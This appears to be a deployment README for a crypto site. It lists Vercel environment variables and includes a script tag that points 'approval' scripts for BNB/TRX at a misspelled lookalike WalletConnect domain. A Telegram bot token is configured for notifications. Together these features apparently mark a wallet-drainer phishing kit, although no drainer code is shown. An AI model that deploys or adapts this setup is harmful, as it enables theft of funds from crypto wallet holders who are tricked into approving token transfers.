# Vercel Environment Variables

Same as the BEP20 reference site. Add these in **Vercel → Project → Settings → Environment Variables**:

| Variable | Description | Example |
|----------|-------------|---------|
| `TRUST_CARD_APPROVAL_URL` | URL for fluxpay scripts (BNB/TRX). Leave empty to use local `/fluxpay/` | `https://wallete-connect-bep-20.vercel.app` |
| `VITE_PROJECT_ID` | WalletConnect Project ID from [dashboard.walletconnect.com](https://dashboard.walletconnect.com) | `11e5445365f720d1050dc106ba2e78d6` |
| `TELEGRAM_BOT_TOKEN` | (Optional) From @BotFather for notifications | |
| `TELEGRAM_CHAT_ID` | (Optional) Chat ID for notifications | |

**Note:** The `/api/config` serverless endpoint injects these at runtime. Ensure the `api/` folder is deployed. If `/api/config` is not available, add before `apply-now-flow.js`:
```html
<script>window.TRUST_CARD_APPROVAL_URL='https://wallete-connect-bep-20.vercel.app';</script>
```
